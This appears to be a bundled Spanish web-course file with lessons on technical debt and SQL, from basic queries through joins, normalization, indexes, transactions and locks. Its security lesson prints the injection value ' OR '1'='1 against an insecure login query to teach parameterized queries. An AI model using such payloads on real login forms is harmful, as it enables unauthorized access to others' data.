*   **Prudente / Deliberada:** "Sabemos que esto no escala, pero necesitamos lanzar hoy para validar el mercado. Lo arreglaremos en Q2". (Estratgica - Prstamo bancario).
*   **Prudente / Inadvertida:** "Hicimos lo mejor que sabamos hace un ao, pero ahora entendemos mejor el problema y vemos que el diseo est mal". (Aprendizaje).

## 2. Cmo pagarla
Si nunca pagas la deuda, el inters compuesto (lentitud de desarrollo) te matar.
*   **Regla del Boy Scout:** "Deja el cdigo un poco mejor de lo que lo encontraste". En cada ticket, arregla algo pequeo.
*   **Sprints de Refactorizacin:** Dedicar tiempo explcito (ej: 20% del sprint) a limpiar. Difcil de vender al negocio.
*   **Muerte a los "TODO":** Un comentario \`// TODO: Arreglar esto\` es una tumba. Si es importante, crea un ticket en el backlog. Si no, brralo.

## 3. Refactorizacin Segura
Nunca refactorices sin **Tests**.
*   Refactorizar es cambiar la estructura interna sin cambiar el comportamiento externo.
*   Si no tienes tests, no ests refactorizando, ests simplemente cambiando cosas y rezando.

## 4. Legacy Code
Definicin (Michael Feathers): "Cdigo Legacy es simplemente cdigo sin tests".
*   Estrategia para atacar un monstruo Legacy: No reescribas todo. Crea una "costura" (seam), asla un pedazo, aade tests a ese pedazo, y luego refactoriza.

---

### Misin Senior:
Identifica la zona ms "fea" de tu base de cdigo actual. Esa que a todos les da miedo tocar.
1.  No la reescribas an.
2.  Escribe un **Test de Caracterizacin**: Un test que simplemente confirma lo que el cdigo hace ahora (incluso si est mal). Esto crea una red de seguridad.
3.  Ahora haz un refactor pequeo (renombrar variables, extraer mtodos).
4.  Verifica que el test siga pasando.
Esto es domar a la bestia.
`,completed:!1}]},L1={id:"sql",title:"SQL y Bases de Datos",description:"El lenguaje universal de los datos. Aprende a disear, consultar y optimizar bases de datos relacionales como un profesional.",completed:!1,track:"Especializacin para Desarrolladores",lessons:[{id:"sql-01-intro-sql",title:"Qu es una Base de Datos y qu es SQL?",level:"junior",content:`# Leccin 01: Qu es una Base de Datos y qu es SQL?

Las aplicaciones modernas no sirven de nada si no recuerdan la informacin. Aqu entran las Bases de Datos Relacionales (RDBMS).

## 1. La Base de Datos
Piensa en una Base de Datos como un gran archivero digital inteligente.
*   **Tablas:** Son como hojas de clculo de Excel.
*   **Columnas:** Definen qu tipo de dato se guarda (Nombre, Edad, Email).
*   **Filas (Registros):** Son los datos reales de cada usuario o producto.

## 2. SQL (Structured Query Language)
SQL es el idioma universal para hablar con base de datos como **PostgreSQL, MySQL, SQLite o SQL Server**.
Aunque cambie la marca de la base de datos, el idioma SQL es 90% el mismo.

## 3. Estructura de una Tabla
Imagina una tabla \`usuarios\`:

| id | nombre | email | edad |
| :--- | :--- | :--- | :--- |
| 1 | Ana | ana@mail.com | 30 |
| 2 | Luis | luis@mail.com | 25 |

*   **Primary Key (PK):** El \`id\` es nico para cada fila. Es como el DNI del registro.

---

### Concepto Junior:
SQL es un lenguaje "Declarativo". T le dices a la base de datos **QU** quieres (\`SELECT *\`), no **CMO** buscarlo. El motor de la base de datos se encarga del "cmo".
`,completed:!1},{id:"sql-02-consultas-basicas",title:"Consultas Bsicas (SELECT, WHERE, LIMIT)",level:"junior",content:"# Leccin 02: Consultas Bsicas (SELECT, WHERE, LIMIT)\n\nLa orden ms importante en SQL es `SELECT`. Sirve para pedirle datos a la base.\n\n## 1. El `SELECT` bsico\nPara traer todos los datos de la tabla `usuarios`:\n```sql\nSELECT * FROM usuarios;\n```\n*   `*`: Significa \"trae todas las columnas\".\n*   `FROM`: Indica la tabla.\n\nPara traer solo el nombre y la edad (esto es mejor para el rendimiento):\n```sql\nSELECT nombre, edad FROM usuarios;\n```\n\n## 2. Filtrando con `WHERE`\nNo queremos siempre ver a TODOS los usuarios. Queremos buscar.\n```sql\nSELECT * FROM usuarios WHERE edad > 18;\n```\nOtras condiciones:\n*   `WHERE nombre = 'Ana'`\n*   `WHERE edad > 18 AND nombre = 'Luis'`\n*   `WHERE edad < 18 OR nombre = 'Pepe'`\n\n## 3. Paginacin con `LIMIT` y `OFFSET` (PostgreSQL/MySQL)\nSi tienes 1 milln de usuarios, no quieres descargarlos todos de golpe.\n```sql\nSELECT * FROM usuarios LIMIT 10;\n```\nEsto te trae solo los primeros 10.\n\n---\n\n### Misin Junior:\nNunca te olvides del `;` al final de la consulta. Es la forma de decirle al motor de base de datos \"Ya termin de escribir, ejectalo!\".\n",completed:!1},{id:"sql-03-manipulacion-datos",title:"Insertar, Borrar y Actualizar (INSERT, DELETE, UPDATE)",level:"junior",content:"# Leccin 03: Insertar, Borrar y Actualizar (INSERT, DELETE, UPDATE)\n\nYa sabes leer datos. Ahora vas a crearlos, cambiarlos y borrarlos.\n\n## 1. Insertando datos (`INSERT INTO`)\nPara agregar un nuevo usuario:\n```sql\nINSERT INTO usuarios (nombre, email, edad)\nVALUES ('Pedro', 'pedro@mail.com', 22);\n```\nFjate que `(nombre, email, edad)` son las columnas, y `('Pedro', ...)` son los valores en el mismo orden. No hace falta poner el `id` si es auto-incremental.\n\n## 2. Actualizando datos (`UPDATE`)\nPara cambiar el email de Pedro:\n```sql\nUPDATE usuarios\nSET email = 'pedro_nuevo@mail.com'\nWHERE id = 3;\n```\n**Regla de Oro:** Siempre pon un `WHERE` en el `UPDATE`. Si se te olvida, cambiars los emails de TODOS los usuarios!\n\n## 3. Borrando datos (`DELETE FROM`)\nPara eliminar un usuario:\n```sql\nDELETE FROM usuarios\nWHERE nombre = 'Pedro';\n```\nDe nuevo, el `WHERE` es **CRTICO**. `DELETE FROM usuarios;` vaca la tabla entera en milisegundos y te despide del trabajo.\n\n---\n\n### Misin Junior:\nSi tienes miedo de equivocarte con un `UPDATE` o `DELETE`, primero haz un `SELECT` usando el mismo `WHERE` para ver qu filas vas a afectar.\n",completed:!1},{id:"sql-04-practica-junior",title:"Prctica SQL Junior: El Pequeo Almacn",level:"junior",content:`# Prctica SQL Junior: El Pequeo Almacn

Acepta estos desafos para demostrar que dominas lo bsico.

---

## 1. El Inventario
**Consigna:** Tienes la tabla \`productos\` con columnas \`(id, nombre, precio, stock)\`.
1.  Inserta 3 productos (Manzana: 10, Pera: 15, Banana: 8).
2.  Muestra los productos que cuesten menos de 12.
3.  Actualiza el precio de la Banana a 9.
4.  Borra la Pera de la tabla.

## 2. El Filtro Compuesto
**Consigna:** Tienes la tabla \`empleados\` \`(id, nombre, departamento, salario)\`.
1.  Busca todos los empleados de "Ventas" que ganen ms de 2000.
2.  Ordena el resultado por salario de mayor a menor (\`ORDER BY salario DESC\`).

## 3. Limitando resultados
**Consigna:**
*   Cmo obtendras solo los 5 productos ms caros de la tabla \`productos\`?
(Pista: Order By precio DESC y luego Limit).

---

### Resultado esperado:
Entender la estructura bsica de \`SELECT\`, \`FROM\`, \`WHERE\`, \`ORDER BY\` y el peligro de \`UPDATE/DELETE\` sin \`WHERE\`.
`,completed:!1,isProject:!0},{id:"sql-05-joins-relaciones",title:"Uniendo tablas con JOIN",level:"semi-senior",content:`# Leccin 05: Uniendo tablas con JOIN

Hasta ahora solo hemos consultado una tabla a la vez. Pero la gracia de las bases de datos **Relacionales** es... las relaciones!

## 1. El concepto de la Clave Fornea (Foreign Key)
Imagina dos tablas:
*   \`usuarios\` (id, nombre)
*   \`pedidos\` (id, producto, usuario_id)

La columna \`usuario_id\` en \`pedidos\` apunta al \`id\` de la tabla \`usuarios\`. Es el puente.

## 2. INNER JOIN (La interseccin)
Trae solo los registros que coinciden en ambas tablas. Si una orden no tiene usuario, o un usuario no tiene ordenes, no aparecen.
\`\`\`sql
SELECT usuarios.nombre, pedidos.producto
FROM usuarios
INNER JOIN pedidos ON usuarios.id = pedidos.usuario_id;
\`\`\`

## 3. LEFT JOIN (Todo lo izquierda)
Trae todos los registros de la tabla izquierda (\`usuarios\`) y, si hay coincidencia, los datos de la derecha (\`pedidos\`). Si no hay coincidencia, pone \`NULL\`.
\`\`\`sql
SELECT usuarios.nombre, pedidos.producto
FROM usuarios
LEFT JOIN pedidos ON usuarios.id = pedidos.usuario_id;
\`\`\`
Esto te mostrara a "Ana" aunque ella no haya comprado nada todava.

## 4. RIGHT JOIN
Es lo opuesto al LEFT JOIN. Trae todos los pedidos, aunque no tengan usuario (raro pero posible).

---

### Misin Semi-Senior:
Aprender que \`FROM tabla1, tabla2\` es una forma vieja y mala de hacer JOINs. Usa siempre la sintaxis explcita \`JOIN ... ON ...\`.
`,completed:!1},{id:"sql-06-agrupacion-having",title:"Agrupacin y Agregacin (GROUP BY, COUNT, SUM)",level:"semi-senior",content:"# Leccin 06: Agrupacin y Agregacin (GROUP BY, COUNT, SUM)\n\nA veces no quieres ver los registros individuales, quieres ver resmenes. Cuntos usuarios hay? Cul es el promedio de edad?\n\n## 1. Funciones de Agregacin\n*   `COUNT(*)`: Cuenta filas.\n*   `SUM(columna)`: Suma valores.\n*   `AVG(columna)`: Calcula el promedio.\n*   `MAX(columna)`: Busca el valor mximo.\n*   `MIN(columna)`: Busca el valor mnimo.\n\n## 2. Agrupando con `GROUP BY`\nSi quieres saber cuntos usuarios hay **por ciudad**.\n```sql\nSELECT ciudad, COUNT(*) as cantidad\nFROM usuarios\nGROUP BY ciudad;\n```\nEsto te devuelve algo como:\n- Madrid: 50\n- Barcelona: 30\n\n## 3. Filtrando grupos con `HAVING`\nEl `WHERE` filtra filas **antes** de agrupar. El `HAVING` filtra grupos **despus** de agrupar.\nQueremos ver solo las ciudades con ms de 10 usuarios:\n```sql\nSELECT ciudad, COUNT(*) as cantidad\nFROM usuarios\nGROUP BY ciudad\nHAVING COUNT(*) > 10;\n```\n\n---\n\n### Misin Semi-Senior:\nEntender la diferencia sagrada entre `WHERE` y `HAVING`.\n*   `WHERE`: Filtra filas individuales (ej: `WHERE edad > 18`).\n*   `HAVING`: Filtra resultados agregados (ej: `HAVING AVG(edad) > 25`).\n",completed:!1},{id:"sql-07-subconsultas",title:"Subqueries (Subconsultas)",level:"semi-senior",content:`# Leccin 07: Subqueries (Subconsultas)

Una Subquery es una consulta dentro de otra consulta. A veces, necesitas informacin previa para hacer la pregunta final.

## 1. Subqueries en el \`WHERE\`
Queremos todos los productos que tengan un precio superior al **promedio** de todos los precios.
El promedio primero hay que calcularlo.
\`\`\`sql
SELECT nombre, precio
FROM productos
WHERE precio > (SELECT AVG(precio) FROM productos);
\`\`\`
La subquery \`(SELECT AVG(precio) FROM productos)\` devuelve un solo nmero (ej: 15.5), y eso es lo que usa la query principal para comparar.

## 2. Subqueries en el \`FROM\` (Tablas derivadas)
A veces, nuestra fuente de datos no es una tabla real, sino el resultado de otra consulta.
\`\`\`sql
SELECT departamento, MAX(salario)
FROM (SELECT * FROM empleados WHERE activo = true) as empleados_activos
GROUP BY departamento;
\`\`\`

## 3. Subqueries vs JOINs
Muchas veces puedes reescribir una Subquery como un JOIN.
*   **Regla general:** Los JOINs suelen ser ms rpidos en bases de datos modernas, pero las Subqueries a veces son ms fciles de leer.

---

### Misin Semi-Senior:
Aprender a usar \`EXISTS\` en lugar de \`IN\` cuando la subquery devuelve muchos resultados, para mejorar la performance.
`,completed:!1},{id:"sql-08-practica-semi-senior",title:"Prctica y Evaluacin: Maestro de Consultas",level:"semi-senior",content:`# Prctica y Evaluacin: Maestro de Consultas

El SQL es como el ajedrez: Pocas reglas, infinitas combinaciones. Demuestra tu nivel Semi-Senior respondiendo a estas preguntas de negocio.

---

## 1. Ejercicio Semi-Senior 1: Ventas por Empleado (JOIN + GROUP BY)
**Consigna:** Tienes \`empleados\` (id, nombre) y \`ventas\` (id, empleado_id, monto).
*   Muestra el nombre de cada empleado y la suma total de sus ventas (\`SUM(monto)\`).
*   Si un empleado no ha vendido nada, debe aparecer con 0 o NULL (Usa \`LEFT JOIN\`).

## 2. Ejercicio Semi-Senior 2: El Cliente VIP (HAVING)
**Consigna:** Tienes la tabla \`clientes\` (id, nombre) y \`compras\` (id, cliente_id, monto).
*   Encuentra los clientes que hayan gastado ms de $10,000 acumulados en total.
*   Ordenalos de mayor a menor gasto.

## 3. Ejercicio Semi-Senior 3: El Producto ms Barato (Subquery)
**Consigna:** Encuentra todos los datos del producto que tenga el precio mnimo de toda la tabla \`productos\`.
(Pista: \`WHERE precio = (SELECT MIN(precio) FROM productos)\`).

---

### Misin:
Un Analista SQL Semi-Senior puede responder preguntas de negocio complejas en una sola consulta, sin tener que descargar los datos a Excel y procesarlos ah.
`,completed:!1,isProject:!0},{id:"sql-09-modelado-datos",title:"Modelado de Datos y Relaciones",level:"semi-senior",content:`# Leccin 09: Modelado de Datos y Relaciones

Antes de escribir SQL, hay que dibujar. El **Modelo Entidad-Relacin (MER)** es el mapa de tu base de datos.

## 1. Entidades y Atributos
Una **Entidad** es un objeto del mundo real (Usuario, Producto, Pedido). Se convierte en una **Tabla**.
Los atributos son las caractersticas (Nombre, Precio). Se convierten en **Columnas**.

## 2. Tipos de Relaciones
*   **1 a 1 (One-to-One):** Un usuario tiene un nico perfil de configuracin. (Raro, suelen estar en la misma tabla).
*   **1 a N (One-to-Many):** Un usuario tiene **mochos** pedidos. Un pedido pertenece a **un** solo usuario. (Esta es la ms comn).
*   **N a N (Many-to-Many):** Un estudiante tiene muchas clases. Una clase tiene muchos estudiantes.
    *   **Ojo!** Para hacer esto se necesita una **Tabla Intermedia** (o Pivot Table) que guarda los pares \`(estudiante_id, clase_id)\`.

## 3. Claves (Keys)
*   **Primary Key (PK):** Identifica nica e irrepetiblemente a una fila. (Suele ser \`id\` autoincremental o UUID).
*   **Foreign Key (FK):** Apunta a la PK de otra tabla. Es la que crea la relacin fsica.

---

### Misin de Diseo:
Si tienes una relacin N a N y no creas una tabla intermedia, ests cometiendo un error grave de diseo que har imposible consultar tus datos eficientemente.
`,completed:!1},{id:"sql-10-normalizacion",title:"Normalizacin (1NF, 2NF, 3NF)",level:"semi-senior",content:`# Leccin 10: Normalizacin (1NF, 2NF, 3NF)

Normalizar es organizar tus datos para evitar duplicados y anomalas. Es la diferencia entre un Excel gigante y una Base de Datos profesional.

## 1. Primera Forma Normal (1NF): Atomicidad
*   **Regla:** Una columna no puede tener ms de un valor.
*   **MAL:** Columna \`telefonos\` = "555-1234, 555-6789".
*   **BIEN:** Crear tabla \`telefonos_usuarios\` con una fila por cada telfono.

## 2. Segunda Forma Normal (2NF): Dependencia Parcial
*   **Regla:** Todo atributo debe depender de la **Clave Primaria completa**.
*   Si tienes una tabla \`ordenes (id_orden, id_producto, nombre_producto, cantidad)\`.
    *   \`nombre_producto\` depende solo de \`id_producto\`, no de la orden.
    *   **BIEN:** Mueve \`nombre_producto\` a una tabla separada \`productos\`.

## 3. Tercera Forma Normal (3NF): Dependencia Transitiva
*   **Regla:** Ningn atributo no-clave debe depender de otro atributo no-clave.
*   Si tienes \`usuarios (id, ciudad, codigo_postal)\`.
    *   \`ciudad\` depende de \`codigo_postal\`, no directamente del usuario.
    *   **BIEN:** Tabla \`ciudades (codigo_postal, ciudad)\` y referenciar por CP. (A veces se ignora por performance, esto se llama **Desnormalizacin**).

---

### Misin Normalizadora:
El objetivo de normalizar es **evitar la redundancia**. Si cambias el nombre de un producto, solo deberas cambiarlo en un lugar (la tabla \`productos\`), no en cada una de las 5000 rdenes que lo compraron.
`,completed:!1},{id:"sql-11-indices-vistas",title:"ndices, Vistas y Sp (Stored Procedures)",level:"senior",content:`# Leccin 11: ndices, Vistas y Sp (Stored Procedures)

Herramientas para que la base de datos trabaje por ti, y no al revs.

## 1. ndices (Indexes)
Un ndice es como el ndice al final de un libro.
*   **Sin ndice:** Para buscar a "Octavio", la DB tiene que leer TODAS las 10 millones de filas (Full Table Scan).
*   **Con ndice:** La DB va directo a la pgina donde est "Octavio".
\`\`\`sql
CREATE INDEX idx_usuarios_nombre ON usuarios(nombre);
\`\`\`
**Costo:** Los ndices ocupan espacio y hacen que los \`INSERT\` sean ms lentos (porque hay que actualizar el ndice).

## 2. Vistas (Views)
Son consultas guardadas que actan como tablas virtuales.
\`\`\`sql
CREATE VIEW usuarios_activos AS
SELECT nombre, email FROM usuarios WHERE activo = true;
\`\`\`
Ahora puedes hacer: \`SELECT * FROM usuarios_activos;\`. Es til para simplificar queries complejas o por seguridad (ocultar columnas sensibles).

## 3. Stored Procedures (Procedimientos Almacenados)
Es cdigo (lgica) que vive dentro de la base de datos.
\`\`\`sql
CREATE PROCEDURE DarDeBaja(IN usuario_id INT)
BEGIN
    UPDATE usuarios SET activo = false WHERE id = usuario_id;
    INSERT INTO log_bajas (usuario_id, fecha) VALUES (usuario_id, NOW());
END;
\`\`\`
Ventaja: Reduces el trfico de red, solo envas \`CALL DarDeBaja(5)\`.

---

### Misin Semi-Senior:
No indexes todo. Un exceso de ndices puede matar el rendimiento de escritura. Solo indiza las columnas que usas en el \`WHERE\`, \`JOIN\` y \`ORDER BY\`.
`,completed:!1},{id:"sql-12-transacciones-acid",title:"Transacciones y ACID",level:"senior",content:`# Leccin 12: Transacciones y ACID

Las Bases Relacionales garantizan la integridad. La clave son las Transacciones.

## 1. El concepto de la Transaccin
**Ejemplo:** Octavio le transfiere $1000 a Laura.
1.  Restar $1000 a Octavio.
2.  Sumar $1000 a Laura.

Si el servidor se apaga justo entre el paso 1 y el 2, el dinero desaparece. Pnico!
Para evitar esto, usamos \`BEGIN\`, \`COMMIT\` y \`ROLLBACK\`.
\`\`\`sql
BEGIN;
UPDATE cuentas SET saldo = saldo - 1000 WHERE id = 1;
-- Ups! Se corta la luz.
-- La base de datos hace ROLLBACK automtico al reiniciarse.
COMMIT;
\`\`\`

## 2. ACID
*   **Atomicidad:** "Todo o nada". O ocurren todos los pasos, o ninguno.
*   **Consistencia:** La DB pasa de un estado vlido a otro estado vlido (respetando restricciones).
*   **Aislamiento (Isolation):** Si dos transacciones ocurren a la vez, no se ven entre s hasta que terminan.
*   **Durabilidad:** Si haces COMMIT, el dato se escribe en disco y sobrevive a un reinicio.

## 3. Niveles de Aislamiento (Isolation Levels)
*   **Read Committed:** Solo lees datos confirmados (el default).
*   **Serializable:** Como si las transacciones ocurrieran una tras otra (lento pero seguro).

---

### Misin Semi-Senior:
Nunca dejes transacciones abiertas (\`BEGIN\` sin \`COMMIT\`). Bloquean filas y pueden congelar toda la aplicacin.
`,completed:!1},{id:"sql-13-optimizacion-explain",title:"Optimizacin Avanzada y JOIN Algorithms (Senior)",level:"senior",content:`# Leccin 13: Optimizacin Avanzada y JOIN Algorithms (Senior)

En el nivel Senior, no escribes consultas que funcionen, escribes consultas que vuelen.

## 1. EXPLAIN ANALYZE
Es el comando mgico que te dice QU hace el motor.
\`\`\`sql
EXPLAIN ANALYZE SELECT * FROM usuarios WHERE ciudad = 'Madrid';
\`\`\`
Te dir si hizo:
*   \`Index Scan:\` Us el ndice (Rpido!).
*   \`Seq Scan\` (Sequential): Ley toda la tabla (Lento!).

## 2. Algoritmos de JOIN
El motor elige automticamente, pero t debes entenderlos.
*   **Nested Loop Join:** Itera tabla A y dentro tabla B. Bueno para tablas pequeas. O(N*M).
*   **Hash Join:** Construye una tabla Hash. Rapidsimo para tablas grandes sin ndices. O(N+M).
*   **Merge Join:** Requiere que las tablas estn ordenadas. O(N log N + M log M).

## 3. Optimizando el \`WHERE\`
*   **Sargable Queries:** Search ARGument ABLE. Una query que puede usar ndices.
    *   **MAL:** \`WHERE YEAR(fecha) = 2023\`. (Calcula la funcin para cada fila, no usa ndice).
    *   **BIEN:** \`WHERE fecha >= '2023-01-01' AND fecha < '2024-01-01'\`. (Usa ndice de rango).
*   **Evitar \`LIKE '%texto%'\`:** El \`%\` al inicio inhabilita el ndice B-Tree habitual.

---

### Misin Senior:
Si una query tarda 10 segundos, no aadas ms RAM al servidor. Haz \`EXPLAIN ANALYZE\` y descubre qu ndice falta o qu funcin est matando el rendimiento.
`,completed:!1},{id:"sql-14-locks-concurrencia",title:"Bloqueos (Locks) y Concurrencia (Senior)",level:"senior",content:`# Leccin 14: Bloqueos (Locks) y Concurrencia (Senior)

Qu pasa si 100 usuarios intentan reservar el ltimo asiento del avin a la vez?

## 1. El Problema de la Carrera (Race Condition)
Dos consultas leen \`asientos = 1\`. Ambas restan 1. Ambas hacen \`UPDATE\`. Saldo final: -1. Overbooking!

## 2. Bloqueos Explcitos (SELECT FOR UPDATE)
Para evitar esto, le dices a la DB: "Voy a leer esta fila, pero bloquala para que nadie ms la toque hasta que termine mi transaccin".
\`\`\`sql
BEGIN;
SELECT * FROM vuelos WHERE id = 123 FOR UPDATE;
-- Aqu nadie ms puede leer ni escribir esta fila.
UPDATE vuelos SET asientos = asientos - 1 WHERE id = 123;
COMMIT;
-- Se libera el bloqueo.
\`\`\`

## 3. Deadlocks (El abrazo mortal)
Transaccin A bloquea Fila 1 y quiere Fila 2.
Transaccin B bloquea Fila 2 y quiere Fila 1.
Ambas esperan infinitamente.
*   **Solucin:** Siempre accede a las tablas en el mismo orden (primero tabla 1, luego tabla 2). O usa \`timeout\` en las transacciones.

## 4. MVCC (Multi-Version Concurrency Control)
Es cmo Postgres y Oracle manejan lecturas sin bloquear escrituras.
*   Cuando haces \`UPDATE\`, la DB no sobrescribe la fila vieja. Crea una copia nueva.
*   Las transacciones viejas siguen viendo la versin vieja hasta que terminan (Snapshot Isolation).

---

### Misin Senior:
Los bloqueos matan el rendimiento si no se liberan rpido. Mantn tus transacciones cortas y concisas.
`,completed:!1},{id:"sql-15-practica-senior",title:"Prctica y Evaluacin: Arquitecto Senior de Bases de Datos",level:"semi-senior",content:`# Prctica y Evaluacin: Arquitecto Senior de Bases de Datos

Demuestra tu nivel arquitectnico y de optimizacin.

---

## 1. El ndice Sargable (Performance)
**Pregunta:** Tienes una consulta \`SELECT * FROM ordenes WHERE YEAR(fecha) = 2023\`.
*   Explica por qu Postgres no puede usar el ndice \`idx_fecha\`.
*   Reescribe la consulta para que **S pueda usarlo**.

## 2. El Concurso de "Me Gusta" (Locks, ACID)
**Escenario:**
*   Tienes una tabla \`posts (id, likes)\`.
*   Llegan 1000 usuarios simultneamente para dar "Like".
*   Si haces \`UPDATE posts SET likes = likes + 1 WHERE id = 123\` sin transaccin, qu pasa?
*   Cmo lo arreglaras usando \`SELECT FOR UPDATE\` o \`Isolation Levels\`?

## 3. Optimizando JOINs
**Escenario:** Tienes una tabla \`usuarios\` (1 milln de registros) y una tabla \`ventas\` (10 millones de registros).
*   El \`Deep Query Optimizer\` decide usar \`NESTED LOOP\` en lugar de \`HASH JOIN\`. Por qu puede pasar esto? (Pista: Estadsticas desactualizadas).
*   Cmo forzaras al motor a actualizar estadsticas (\`ANALYZE\`)?

---

### Recordatorio Final:
En SQL, una coma mal puesta rompe la sintaxis. Un JOIN mal hecho rompe el servidor. Escribe con cuidado. 
`,completed:!1,isProject:!0},{id:"sql-16-sql-backend",title:"SQL en el Backend (Node.js y Python)",level:"senior",content:`# Leccin 16: SQL en el Backend (Node.js y Python)

SQL no vive en el vaco. Lo usamos desde nuestras aplicaciones. Aqu es donde la teora choca con la prctica.

## 1. Drivers Nativos (Raw SQL)
Es la forma ms rpida y directa. Escribes SQL puro dentro de strings en tu cdigo.

### Node.js (con \`pg\`)
\`\`\`javascript
const { Pool } = require('pg');
const pool = new Pool();

// Parameterized Query (Seguro!)
const res = await pool.query('SELECT * FROM users WHERE id = $1', [userId]);
console.log(res.rows[0]);
\`\`\`

### Python (con \`psycopg2\` o \`sqlite3\`)
\`\`\`python
import sqlite3
con = sqlite3.connect("tutorial.db")
cur = con.cursor()

# Placeholder ? o %s segun la libreria
cur.execute("SELECT * FROM users WHERE email = ?", (email,))
print(cur.fetchone())
\`\`\`

## 2. ORMs (Object-Relational Mappers)
Herramientas que escriben el SQL por ti. (Prisma, TypeORM, SQLAlchemy, Django ORM).
*   **Ventajas:** Productividad extrema, Tipado fuerte (TypeScript), Migraciones automticas.
*   **Desventajas:** "Cajanegra" (no sabes qu query ejecuta), Performance (a veces generan queries ineficientes), Curva de aprendizaje.

## 3. Query Builders (El punto medio)
Libreras como \`Knex.js\` o \`Kysely\`. Te dejan construir queries con cdigo pero te dan control total.
\`\`\`javascript
db.selectFrom('person')
  .select(['first_name', 'last_name'])
  .where('id', '=', 1)
  .execute()
\`\`\`

---

### Misin Backend:
Un Senior sabe usar un ORM para el 90% de las tareas CRUD simples, y bajar a SQL Puro (Raw) para ese 10% de reportes complejos que el ORM no sabe optimizar.
`,completed:!1},{id:"sql-17-seguridad-sql",title:"Seguridad en Bases de Datos (SQL Injection & Permisos)",level:"senior",content:`# Leccin 17: Seguridad en Bases de Datos (SQL Injection & Permisos)

La base de datos es el tesoro. Protegerla no es opcional.

## 1. El ataque de "SQL Injection"
Imagina un login inseguro:
\`\`\`sql
SELECT * FROM users WHERE username = '$user' AND password = '$pw';
\`\`\`
Si el atacante pone de usuario \`' OR '1'='1\`, la query se convierte en:
\`\`\`sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';
\`\`\`
Esto es siempre \`TRUE\` y entra sin saber la contrasea!

## 2. La solucin: Prepared Statements (Consultas Parametrizadas)
Separa el cdigo (SQL) de los datos (Input).
*   **MAL:** \`query("SELECT * FROM users WHERE id = " + input)\`
*   **BIEN:** \`query("SELECT * FROM users WHERE id = $1", [input])\`
El motor de base de datos trata el input como LITERAL, no como cdigo ejecutable.

## 3. Principio de Menor Privilegio (Roles y Permisos)
No conectes tu app a la DB usando el usuario \`root\` o \`postgres\` (Superadmin).
Crea un usuario especfico para la aplicacin (\`app_user\`).
\`\`\`sql
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'password123';
GRANT SELECT, INSERT, UPDATE, DELETE ON mi_base.* TO 'app_user'@'localhost';
-- NO le des permisos de DROP TABLE o ALTER TABLE!
\`\`\`
As, si alguien hackea tu servidor web, no puede borrar tus tablas.

---

### Misin Seguridad:
Nunca confes en el usuario final. Ni en frontend validation (se puede bypassear con Postman). **Siempre sanitiza y usa parmetros en el backend.**
`,completed:!1},{id:"sql-18-testing-sql",title:"Testing de Consultas SQL",level:"senior",content:`# Leccin 18: Testing de Consultas SQL

Cmo sabes si tu consulta SQL sigue funcionando despus de cambiar la estructura de la tabla? Solo con tests.

## 1. Bases de Datos Efmeras (Ephemeral DBs)
Para testear SQL, idealmente quieres una base de datos real, no un Mock.
*   **Docker:** Antes de correr los tests, levantas un contenedor de Postgres nuevo.
*   **SQLite In-Memory:** Para tests rpidos, usas \`:memory:\`. Pero cuidado, SQLite no tiene todas las funciones de Postgres.

## 2. Fixtures de Datos (Seeding)
Necesitas datos predecibles.
\`\`\`sql
-- setup.sql
INSERT INTO users (id, name, email) VALUES (1, 'Test User', 'test@mail.com');
\`\`\`
Tu test ejecuta esto al inicio y borra todo al final.

## 3. Probando la Performance
En la CI (Integracin Continua), puedes fallar el test si la query tarda ms de 100ms.
\`\`\`python
start = time.time()
db.execute("SELECT * FROM heavy_table")
assert time.time() - start < 0.1
\`\`\`

---

### Misin Testing:
No uses la base de datos de produccin para testear. Nunca. Jams. Ni siquiera "un poquito".
`,completed:!1},{id:"sql-19-errores-comunes",title:"Errores Comunes de un Desarrollador SQL",level:"senior",content:`# Leccin 19: Errores Comunes de un Desarrollador SQL

Prevenir es mejor que curar (especialmente cuando curar implica restaurar un backup de 500GB).

## 1. El Problema "N+1 Queries" (Backend + SQL)
Tienes una lista de 100 usuarios y quieres sus direcciones.
*   **Junior:** Hace 1 query para obtener usuarios, y luego un bucle \`for\` que hace 1 query extra por cada usuario. Total: 101 consultas.
*   **Solucin:** Usar \`JOIN\` o \`WHERE id IN (...)\`. Total: 1 o 2 consultas.

## 2. Guardar listas separadas por comas (1NF Violation)
*   **Error:** Columna \`tags\` con valor "sql,python,react".
*   **Problema:** Cmo buscas "todos los usuarios que saben python"? \`LIKE '%python%'\` es lento e inexacto.
*   **Solucin:** Tabla intermedia \`usuarios_tags\`.

## 3. SELECT * (Asterisco) en Produccin
*   Trae columnas que no necesitas (desperdicia red y memoria).
*   Si agregas una columna pesada (BLOB) a la tabla, tu app se vuelve lenta sin aviso.

---

### Misin de Calidad:
Nunca uses \`ORDER BY RAND()\` en tablas grandes. Para sacar un registro aleatorio, el motor tiene que ordenar *toda la tabla* (1 milln de filas) y luego tomar uno. Es la muerte del CPU.
`,completed:!1},{id:"sql-20-roadmap-sql",title:"Roadmap SQL - De Aprendiz a DBA",level:"senior",content:`# Leccin 20: Roadmap SQL - De Aprendiz a DBA

El SQL es una de las habilidades ms longevas y tiles que puedes aprender.

## Fase 1: El Consultor (Junior)
*   **Foco:** Extraer datos.
*   **Aprender:** SELECT, WHERE, JOIN bsico, GROUP BY.
*   **Tools:** DBeaver, pgAdmin.
*   **Caso Real:** "Scame un reporte de ventas del mes pasado en Excel".

## Fase 2: El Arquitecto (Semi-Senior)
*   **Foco:** Disear y construir.
*   **Aprender:** Create Table, Constraints (FK, PK, UNIQUE), Normalizacin, ndices bsicos.
*   **Tools:** Diagramas ER, Docker.
*   **Caso Real:** Disear la base de datos para un E-commerce desde cero.

## Fase 3: El Optimizador (Senior)
*   **Foco:** Performance y Escala.
*   **Aprender:** EXPLAIN ANALYZE, Locks, Partitioning, Replication, Sharding.
*   **Tools:** Pgbadger, Datadog.
*   **Caso Real:** "La bsqueda tarda 5 segundos. Bjala a 50ms sin cambiar el hardware".

---

### Misin Final:
SQL no muere. Las bases NoSQL (Mongo, Redis) son geniales para casos especficos, pero el 90% del mundo corre sobre SQL. Aprndelo bien y tendrs trabajo por 20 aos.
`,completed:!1}]},R1={id:"tailwind",title:"Tailwind CSS",description:"Domina el framework de utilidades CSS ms popular y acelera tu flujo de trabajo de diseo.",completed:!1,lessons:[{id:"tailwind-junior-que-es-tailwind",title:"Qu es Tailwind CSS y por qu usarlo?",level:"junior",content:`# Leccin 1: Qu es Tailwind CSS y por qu usarlo?

